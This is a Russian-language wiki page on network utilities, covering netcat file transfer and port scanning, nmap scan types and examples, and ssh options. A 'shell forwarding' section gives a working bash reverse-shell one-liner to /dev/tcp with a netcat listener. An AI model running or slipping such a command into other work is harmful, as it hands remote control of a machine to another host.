# Сетевые утилиты

### NetCat

**Синтаксис**

> _ncat [OPTIONS...] [hostname] [port]_

**Описание** Netcat, она же nc — простая, но очень удобная консольная утилита, предназначенная для работы с портами и [TCP](./2.3.2.3%20Protocols.md) и/или [UDP](./2.3.2.3%20Protocols.md) трафиком между узлами сети.

**Полезные ключи:**

- `-l` — указать какой [порт](./2.3.2.5%20Ports.md) будет слушать nc для приёма входящих соединений;
- `-n` — не использовать преобразование [IP](./2.3.2.4%20IP.md) в имена хостов;
- `-k` — продолжать принимать соединения на указанном с ключём -l порту после того, как завершится активная сессия;
- `-s` — указать локальный [IP](./2.3.2.4%20IP.md) интерфейса, который будет использоваться для отправки пакетов;
- `-v` — использовать подробный режим;
- `-u` — использовать [UDP](./2.3.2.3%20Protocols.md) вместо [TCP](./2.3.2.3%20Protocols.md), который используется по-умолчанию;
- `-w` — таймаут, после которого сессия будет закрыта, если не активна;
- `-X` — указать тип прокси, который использоваться, иначе — используется SOCK5;
- `-x` — адрес:порт прокси-сервера, через который необходимо отправлять трафик;

**Пример использования**

На стороне «сервера» (машина, которая будет принимать трафик) запускаем nc для приёма входящих пакетов на порт `12345`:

```
$ nc -l 12345 > ../temp.log
```

На стороне «клиента» — выполняем чтение файла и пересылаем содержимое на «сервер»:

```
$ tail -f /var/log/zabbix/zabbix_agentd.log | nc 10.249.140.239 12345
```

Переслать файл можно так. На стороне сервера — запустим `nc` для приёма соединений на [порту](./2.3.2.5%20Ports.md) `12346` и укажем выводить содержимое принятого файла в локальный файл:

```
# nc -l 12346 > post-install.log
```

На стороне клиента — запускаем nc и считываем в него содержимое файла `post-install.log`:

```
# nc 10.249.140.239 12346 < post-install.log
```

Интересная возможность — сканирование [портов](./2.3.2.5%20Ports.md), хотя и далеко от возможностей `nmap`:

```
# nc -z -v 10.249.140.239 8080-8085
nc: connect to 10.249.140.239 port 8080 (tcp) failed: Connection refused
Connection to 10.249.140.239 8081 port [tcp/tproxy] succeeded!
nc: connect to 10.249.140.239 port 8082 (tcp) failed: Connection refused
nc: connect to 10.249.140.239 port 8083 (tcp) failed: Connection refused
nc: connect to 10.249.140.239 port 8084 (tcp) failed: Connection refused
nc: connect to 10.249.140.239 port 8085 (tcp) failed: Connection refused
```

### NMap

nmap - Утилита для исследования [сети](./2.3.2.1%20WWW.md) и сканер [портов](./2.3.2.5%20Ports.md)

**Синтаксис**

> _nmap [Scan Type...] [Options] {target specification}_

**Описание** _Nmap (“Network Mapper”)_ это утилита с открытым исходным кодом для исследования сети и проверки безопасности. Она была разработана для быстрого сканирования больших сетей, хотя прекрасно справляется и с единичными целями. Nmap использует сырые [IP](./2.3.2.4%20IP.md) пакеты оригинальными способами, чтобы определить какие хосты доступны в сети, какие службы (название приложения и версию) они предлагают, какие операционные системы (и версии [ОС](/2%20ComputerScience/2.0%20Linux/2.0.1%20Linux.md)) они используют, какие типы пакетных фильтров/брандмауэров используются и еще дюжины других характеристик. В тот время как Nmap обычно используется для проверки безопасности, многие сетевые и системные администраторы находят ее полезной для обычных задач, таких как контролирование структуры сети, управление расписаниями запуска служб и учет времени работы хоста или службы.

**Полезные ключи:**

- `-sT` (scan TCP) - использовать метод TCP connect(). Наиболее общий метод сканирования TCP-портов.
- `-sS` (scan SYN) - использовать метод TCP SYN. Этот метод часто называют "полуоткрытым" сканированием, поскольку при этом полное TCP-соединение с портом сканируемой машины не устанавливается.
- `-sF,-sX,-sN` (scan FIN, scan Xmas, scan [NULL](https://github.com/eldaroid/iOSWiki/blob/master/5%20Swift/5.3%20DataRepresentations/5.3.1%20DataTypes/5.3.1.4%20ValueTypes/Enumeration/Optional.md#в-чём-разница-между-nan-null-nil-и-none)) - "невидимое" FIN, Xmas Tree и [NULL](https://github.com/eldaroid/iOSWiki/blob/master/5%20Swift/5.3%20DataRepresentations/5.3.1%20DataTypes/5.3.1.4%20ValueTypes/Enumeration/Optional.md#в-чём-разница-между-nan-null-nil-и-none)-сканирование. Эти методы используются в случае, если SYN-сканирование по каким-либо причинам оказалось неработоспособным.
- `-sP` (scan Ping) - ping-"сканирование". Иногда вам необходимо лишь узнать адреса активных хостов в сканируемой сети. Nmap может сделать это, послав ICMP-сообщение "запрос эха" на каждый [IP-адрес](./2.3.2.4%20IP.md), указанный вами.
- `-sV` (scan Version) - включение режима определения версий служб, за которыми закреплены сканируемые порты.
- `-sU` (scan UDP) - сканировать [UDP](./2.3.2.3%20Protocols.md)-порты.
- `-sO` (scan Open protocol) - сканирование протоколов [IP(./2.3.2.4%20IP.md).
- `-sI`(scan Idle) - позволяет произвести абсолютно невидимое сканирование портов. Атакующий может просканировать цель, не посылая при этом пакетов от своего [IP-адреса](./2.3.2.4%20IP.md).

**Пример использования**

Запустим командой:

```
# nmap scanme.nmap.org
Interesting ports on scanme.nmap.org (74.207.244.221):
Not shown: 998 closed ports
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
```

Ничего необычного, ssh на стандартном порту и [http на 80](./2.3.2.3%20Protocols.md). Nmap распознаёт следующие состояния [портов](./2.3.2.5%20Ports.md): open, filtered, closed, или unfiltered. Open означает, что приложение на целевой машине готово для принятия пакетов на этот [порт](./2.3.2.5%20Ports.md). Filtered означает, что брандмауэр, фильтр, или что-то другое в сети блокирует порт, так что Nmap не может определить, является ли порт открытым или закрытым. Closed — не связанны в данный момент ни с каким приложением, но могут быть открыты в любой момент. Unfiltered порты отвечают на запросы Nmap, но нельзя определить, являются ли они открытыми или закрытыми.

```
# nmap -sV example.com example2.com
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 5.3p1 Debian 3ubuntu7 (protocol 2.0)
80/tcp open http Apache httpd 2.2.14 ((Ubuntu))
Service Info: OS: Linux
```

Прогресс налицо — мы узнали точные названия используемых служб и даже их версии, а заодно узнали точно, какая [операционная система](/2%20ComputerScience/2.0%20Linux/2.0.1%20Linux.md) стоит на сервере. С расшифровкой никаких проблем не возникает, все вполне понятно.

Aгрессивное сканирование можно провести, указав ключ -A:
```
# nmap -A scanme.nmap.org
```

Nmap выведет очень много информации, я не стану приводить пример. Сканирование может длится довольно долго, занимая несколько минут.

В локальных сетях или просто имея на руках диапазон [ip адресов](./2.3.2.4%20IP.md), удобно проверить их на занятость с помощью ключей -sP:

```
# nmap -sP 192.168.1.0/24
```

Cканирование проходит довольно быстро, так как по сути это обычный ping-тест, отвечает ли хост на ping. Следует учесть, что хост может не отвечать на ping из-за настроек фаерволла. Если нужный участок сети нельзя ограничить маской, можно указать диапазон адресов, с какого и по какой надо провести сканирование. Например, есть диапазон адресов с 192.168.1.2 до 192.168.1.5. Тогда выполним:

```
# nmap -sP 192.168.1.2-5
Host 192.168.1.2 is up (0.0023s latency)
Host 192.168.1.3 is up (0.0015s latency)
Host 192.168.1.4 is up (0.0018s latency)
Host 192.168.1.5 is up (0.0026s latency)
```

В моем случае все [IP](./2.3.2.4%20IP.md) в данный момент были в [сети](./2.3.2.1%20WWW.md).

## Remote Shell: 1) shell forwarding / 2) ssh

### 1) shell forwarding

Одна из самых интересных вещей, которые можно сделать с оболочкой, - это переслать ее на другой хост. Вам понадобится nc или netcat на хосте, на который вы пересылаете оболочку.

На хосте с оболочкой необходимо выполнить команду:

`bash -i >& /dev/tcp/192.168.218.1/9999 0>&1`

Адрес `192.168.218.1` - это хост, на который вы хотите перенаправить оболочку. После [IP](./2.3.2.4%20IP.md) (обратите внимание, что вы также можете использовать [имя хоста](./2.3.2.2%20LocalAndWideAreaNetwork.md), но я настоятельно рекомендую использовать [IP](./2.3.2.4%20IP.md), чтобы избежать проблем с разрешением [имен хостов](./2.3.2.2%20LocalAndWideAreaNetwork.md)) вы должны указать номер [порта](./2.3.2.5%20Ports.md) (9999), на котором будет прослушиваться netcat listener.

Вам нужно запустить listener netcat на другой стороне. Дважды проверьте, что нет правил брандмауэра, запрещающих вам принимать соединения.

`nc -l 9999`

Некоторые версии netcat требуют добавить -p перед номером порта. Если все идет хорошо, вы должны получить оболочку на прослушивающем хосте.

### 2) ssh

**Синтаксис**

> ssh [-1246AaCfGgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file] [-L [bind_address:]port:host:hostport] [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port] [-Q cipher | cipher-auth | mac | kex | key | protocol-version] [-R [bind_address:]port:host:hostport] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] [user@]hostname [command]

**Описание** ssh (SSH клиент) - это программа для регистрации на удаленной машине и выполнения на ней команд. Она предназначена для замены rlogin и rsh и осуществления безопасного шифрованного соединения между двумя независимыми компьютерами через незащищенную сеть. Подключения Х11 и произвольные [ТСР/IP](./2.3.2.3%20Protocols.md) порты также могут быть перенаправлены через защищенный канал. ssh подключается и регистрируется к указанному _имени_машины_. Пользователь должен доказать свою подлинность удаленной машине одним из нескольких способов в зависимости от используемой версии протокола.

**Флаги**

- `-a` Отключает перенаправление соединения агента аутентификации
- `-A` Включает перенаправление соединения агента аутентификации.
- `-c blowfish|3des` Выбор пароля для шифрования сеанса. 3des (тройной-des) это кортеж вида [encrypt-decrypt-encrypt](/2%20ComputerScience/2.5%20Cybersecurity/Encryption.md) с тремя различными ключами. Подразумевается, что это более безопасно, чем пароль des более не поддерживаемый в ssh. blowfish это быстрый блочный шифр, это кажется безопаснее и намного быстрее чем 3des. blowfish используется по умолчанию.
- `-c cipher_spec` Дополнительно, для [протокола](./2.3.2.3%20Protocols.md) версии 2, может быть указан через запятую список шифров в порядке их предпочтения. Для получения дополнительной информации смотри Ciphers.
- `-e ch|^ch|none` Устанавливает управляющие символы для сеансов с псевдо-терминалом (по умолчанию: "~"). Управляющие символы распознаются только в начале строки. Управляющий символ следующий за точкой (".") завершит соединение, следующий за [control-Z](https://github.com/eldaroid/iOSWiki/blob/master/1%20Common/1.3%20Terminal/1.3.1%20Teminal.md#shortcuts) приостановит соединение и следующий сам за собой означает один управляющий символ. Установка символа в значение [none](/5%20Swift/5.5%20AbstractMechanism/5.5.4%20AnyvsSome.md#в-чём-разница-между-nan-null-nil-и-none) отключает любые управляющие символы и делает сеанс полностью прозрачным.
- `-f` Запросит ssh перейти в фоновый режим только перед выполнением команды. Это полезно если ssh собирается запросить пароль или парольную фразу, но пользователь хочет сделать это в фоновом режиме.
- `-g` Позволяет удаленным машинам обращаться к локальным перенаправленным портам.
- `-i` файл_идентификации Указывает файл из которого считывается идентификация (приватный ключ) для RSA или DSA аутентификации.
- `-k` Отключает пересылку Kerberos tickets и AFS лексем.
- `-l` имя_регистрации Указывает имя регистрации пользователя в системе, используемое для подключения к удаленной машине.
- `-m mac_spec` Дополнительно, для протокола версии 2 может быть указан разделенный через запятую список MAC (код подлинности сообщения) алгоритмов в порядке предпочтения.
- `-n` Перенаправляет стандартный ввод из /dev/null (фактически, предотвращает чтение из стандартного ввода). Это должно использоваться когда ssh выполняется в фоновом режиме.
- `-N` Не выполнять удаленную команду. Это полезно если вы хотите только перенаправить порты (только протокол версии 2).
- `-p` порт для связи с удаленной машиной.
- `-P` Использовать не привилегированные порты для исходящих соединений.
- `-q` Тихий режим. Подавляет все предупреждения и диагностические сообщения. Будут отображены только фатальные ошибки.
- `-T` Отменить переназначение [терминала](/1%20Common/1.3%20Terminal/1.3.1%20Teminal.md).
- `-v` Режим отладки. Принудит ssh вывести отладочную информацию о его деятельности.
- `-C` Включит сжатие всех данных (включая [stdin, stdout, stderr](/1%20Common/1.3%20Terminal/1.3.1%20Teminal.md) и данные для перенаправленных Х11 и [TCP/IP](/2%20ComputerScience/2.3%20Networking/2.3.2%20Web/2.3.2.3%20Protocols.md) соединений).
- `-L порт:машина:порт_машины` Определяет заданный порт на локальной (клиентской) машине который будет перенаправлен к заданной машине и порт на удаленной машине.
- `-R порт:машина:порт_машины` Указывает заданный порт на удаленной машине (сервере) который будет перенаправлен к заданной машине и локальному порту.
- `-4` Принуждает ssh использовать только [IPv4 адреса](./2.3.2.4%20IP.md).
- `-6` Принуждает ssh использовать только [IPv6 адреса](./2.3.2.4%20IP.md).

---

[2.3.2.5 WebSocket Theme](./2.3.2.6%20WebSocket.md) | [Back To iOSWiki Contents](https://github.com/eldaroid/iOSWiki) | [2.3.2.6 Cookie Theme](./2.3.2.8%20Cookie.md)